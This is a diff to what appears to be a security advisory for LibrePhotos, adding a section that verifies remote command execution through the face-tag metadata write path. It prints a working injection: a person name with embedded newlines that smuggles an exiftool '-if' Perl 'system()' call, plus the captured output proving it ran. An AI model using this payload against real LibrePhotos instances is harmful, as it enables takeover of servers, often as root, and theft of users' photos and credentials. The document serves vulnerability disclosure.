@@ -68,6 +68,25 @@ POST /api/savemetadata
 
 Harness result: the injected Perl `system('id > /tmp/pwned')` executed during ExifTool processing and the output file contained `uid=0(root)` (official Docker deployments run the backend as root).
 
-### Impact
+### Real-Environment Verification (2026-10-06)
+
+Re-verified against the **real backend code** (unmodified clone of `LibrePhotos/librephotos` @ HEAD) with the production `api.metadata.writer.write_metadata()` and the pinned `PyExifTool==0.4.9` driving a real `exiftool 13.55` binary — exactly the deployment shape of the official images:
+
+```
+$ python rce_test.py
+[attacker] person_name = "a\n-if\nsystem('id > .../pwned.txt 2>&1; \
+             echo RCE-as-$(whoami) >> .../pwned.txt') // 1\n-b"
+[victim] calling real write_metadata() -> exiftool via PyExifTool 0.4.9 stay_open stdin
+
+--- canary file /tmp/realverify/evidence/librephotos/pwned.txt ---
+uid=501(0xgenesi) gid=20(staff) groups=20(staff),12(everyone),...
+RCE-as-0xgenesi
+```
+
+The newline-laden person name is transmitted as separate exiftool arguments over PyExifTool's stay-open stdin channel; exiftool evaluates the smuggled `-if <perl>` expression and `system()` runs on the LibrePhotos backend host. Arbitrary command execution via the face-tag write path is confirmed end-to-end.
+
+![Real-environment verification](RealEnv_librephotos.png)
+
+## Impact
 
 Any authenticated low-privilege user (default configurations may expose public registration via `ALLOW_REGISTRATION`; multi-user family instances routinely share the server) achieves arbitrary command execution on the LibrePhotos backend with the backend process identity. In official Docker and standalone deployments this process runs as **root**, yielding full access to every user's photos, database credentials (`DB_PASS`), SMTP credentials, and the host container; an attacker can plant persistent backdoors and pivot to internal databases/proxies.CVSS v3.1 base 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H), with the root execution context pushing real-world impact toward the top of that range.
